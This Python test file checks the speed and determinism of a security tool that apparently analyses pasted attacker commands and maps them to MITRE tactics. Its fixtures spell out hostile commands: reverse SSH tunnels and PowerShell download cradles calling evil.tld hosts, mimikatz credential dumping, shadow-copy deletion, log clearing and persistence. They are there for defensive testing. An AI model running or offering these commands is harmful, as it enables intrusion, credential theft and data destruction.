"""
Rule R23 · Automated Regression Corpus
───────────────────────────────────────
Realistic-payload replay harness that asserts pipeline SLOs are met
on every run.  Fails CI the moment a UI-freezing or memory-blowing
regression sneaks in.

SLOs (per Rule R23):
  · Total render time     ≤ 3000 ms  (hard cap)
  · Total render time     ≤ 1500 ms  (target)
  · Behaviors emitted     ≤ 60       (hard cap)
  · MITRE tactics mapped  ≤ 14
  · Every stage           ≤ its per-stage budget
  · Full SSOT             emitted (never partial)
  · pipeline_timings      populated on metadata
  · decode_status.failed  MUST be false

Payloads are chosen to exercise every path:
  1. Simple PowerShell (canary — must finish in < 200 ms)
  2. Multi-stage attack chain (11 commands, 7 tactics — the case
     that motivated Rule R23)
  3. Base64-encoded PowerShell + IEX download cradle
  4. Heavy nested paste (~75 KB, hundreds of commands — the case
     that caused the "Page Unresponsive" dialog in production)
  5. Ransomware-like impact chain
"""
from __future__ import annotations

import base64
import gzip
import io

import pytest

from services.die.investigation_results import render


# ══════════════════════════════════════════════════════════════════
# Payloads
# ══════════════════════════════════════════════════════════════════
CANARY = "whoami"

MULTI_STAGE = """ssh -R 4444:127.0.0.1:22 attacker@evil.tld
ipconfig /all
Get-ADDomain
wmic product where name='Sophos' call uninstall
vssadmin delete shadows /all /quiet
msiexec /i http://evil.tld/loader.msi /quiet
powershell -ExecutionPolicy Bypass -File loader.ps1
quser
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d evil.exe"""

# Base-64-encoded "IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/x.ps1')"
_INNER_PS = "IEX (New-Object Net.WebClient).DownloadString('http://evil.tld/x.ps1')"
B64_PS = "powershell -w hidden -ep bypass -enc " + \
    base64.b64encode(_INNER_PS.encode("utf-16-le")).decode()

# Very heavy: 200-command paste (~30 KB) exercising many families.
HEAVY = "\n".join([
    f"powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://evil{i}.tld/x.ps1')\""
    for i in range(120)
] + [
    "vssadmin delete shadows /all /quiet",
    "schtasks /create /tn evil /tr evil.exe /sc onlogon",
    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d evil.exe",
    "ssh -R 4444:127.0.0.1:22 evil@attacker.tld",
    "mimikatz.exe sekurlsa::logonpasswords",
    "Compress-Archive C:\\data\\* out.zip",
    "Invoke-WebRequest -Uri http://evil.tld -OutFile x.exe",
    "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList cmd.exe",
])

# Ransomware-esque impact chain — must land in Impact + Defense Evasion + Discovery.
RANSOM = """cipher /w:C:
vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
wevtutil cl Security
wevtutil cl System
net stop backup
taskkill /IM MsMpEng.exe /F"""


# ══════════════════════════════════════════════════════════════════
# SLO assertion helpers
# ══════════════════════════════════════════════════════════════════
def _slo_assertions(ssot: dict, name: str,
                     max_ms: float = 3000.0,
                     max_behaviors: int = 60):
    """Assert every R23 guarantee holds for this SSOT."""
    meta = ssot.get("metadata") or {}
    telem = meta.get("pipeline_timings") or {}
    assert telem, f"[{name}] pipeline_timings must be populated"

    total_ms = telem.get("total_ms")
    assert total_ms is not None, f"[{name}] total_ms missing"
    assert total_ms <= max_ms, (
        f"[{name}] total_ms={total_ms} > {max_ms} — R23 SLO breach\n"
        f"  stages={telem.get('stages_ms')}\n"
        f"  warnings={telem.get('warnings')}"
    )

    # decode_status must never be a hard failure for well-formed input.
    dec = ssot.get("decode_status") or {}
    assert not dec.get("failed"), \
        f"[{name}] decode_status.failed=True — R23 breach: {dec}"

    # Bounded resource envelope.
    inc = ssot.get("incident") or {}
    bh = inc.get("behaviors") or []
    assert len(bh) <= max_behaviors, (
        f"[{name}] behaviors={len(bh)} > cap {max_behaviors} — R23 breach"
    )

    # MITRE tactics ≤ 14 (physical ceiling — sanity check).
    tactics = {t for b in bh for t in (b.get("mitre_tactics") or [])}
    assert len(tactics) <= 14, f"[{name}] tactics={len(tactics)} > 14"

    return telem, tactics


# ══════════════════════════════════════════════════════════════════
# Corpus tests — one per payload
# ══════════════════════════════════════════════════════════════════
class TestR23RegressionCorpus:
    """Every commit must pass every payload with SLOs intact."""

    def test_canary_completes_fast(self):
        out = render(CANARY)
        telem, _ = _slo_assertions(out["object"], "canary",
                                     max_ms=800.0, max_behaviors=5)
        # Canary should be sub-200ms in warm cache; give 800 ms
        # headroom for cold-start CI runners.
        assert telem["total_ms"] < 800.0

    def test_multi_stage_seven_tactics(self):
        out = render(MULTI_STAGE)
        telem, tactics = _slo_assertions(out["object"], "multi_stage")
        assert len(tactics) >= 5, \
            f"expected ≥5 tactics for the multi-stage payload; got {tactics}"

    def test_encoded_powershell_decodes(self):
        out = render(B64_PS)
        _slo_assertions(out["object"], "encoded_ps")
        # The decoded IEX / DownloadString / URL should surface in the SSOT.
        obj_json = str(out["object"]).lower()
        assert "downloadstring" in obj_json or "webclient" in obj_json, \
            "base64-encoded IEX cradle did not decode into the SSOT"

    def test_heavy_paste_stays_within_r23_caps(self):
        out = render(HEAVY)
        telem, tactics = _slo_assertions(
            out["object"], "heavy_paste",
            max_ms=3000.0, max_behaviors=60,
        )
        # This is the payload that used to freeze the browser.  Once
        # R23 is enforced, the pipeline MUST return in ≤ 3 s AND cap
        # behaviors to ≤ 60 (no runaway).
        assert telem["total_ms"] <= 3000.0
        assert len((out["object"].get("incident") or {}).get("behaviors") or []) <= 60

    def test_ransomware_impact_chain(self):
        out = render(RANSOM)
        _, tactics = _slo_assertions(out["object"], "ransomware")
        assert "Impact"          in tactics, tactics
        assert "Defense Evasion" in tactics, tactics


# ══════════════════════════════════════════════════════════════════
# Determinism — same input → byte-identical timings-free SSOT
# ══════════════════════════════════════════════════════════════════
def _timings_free(ssot: dict) -> dict:
    """Strip perf telemetry (varies per run) so we can compare
    the deterministic content of two renders."""
    import copy
    ss = copy.deepcopy(ssot)
    meta = ss.get("metadata") or {}
    meta.pop("pipeline_timings", None)
    meta.pop("performance",      None)
    return ss


class TestR23Determinism:
    """Same input → byte-identical SSOT (excluding timings)."""

    @pytest.mark.parametrize("payload", [
        ("canary", CANARY),
        ("multi_stage", MULTI_STAGE),
        ("heavy", HEAVY),
    ])
    def test_deterministic_render(self, payload):
        name, src = payload
        a = _timings_free(render(src)["object"])
        b = _timings_free(render(src)["object"])
        assert a == b, f"[{name}] non-deterministic render"


# ══════════════════════════════════════════════════════════════════
# Telemetry contract — every render MUST emit timings
# ══════════════════════════════════════════════════════════════════
class TestR23TelemetryContract:
    def test_stages_present(self):
        ssot = render(MULTI_STAGE)["object"]
        stages = (ssot.get("metadata") or {}).get("pipeline_timings", {}).get("stages_ms") or {}
        # Core pipeline stages every render MUST report.
        for required in ("iue", "preprocessor", "die_analyze",
                          "ice_correlate", "paste_synthesis"):
            assert required in stages, f"missing stage timing: {required}"
            assert stages[required] >= 0.0

    def test_budget_flag_on_slow_run(self):
        # We can't force a slow run deterministically, but we can at
        # least assert the budget_hit field exists.
        ssot = render(MULTI_STAGE)["object"]
        telem = (ssot.get("metadata") or {}).get("pipeline_timings") or {}
        assert "budget_hit" in telem
        assert "budget_total_ms" in telem
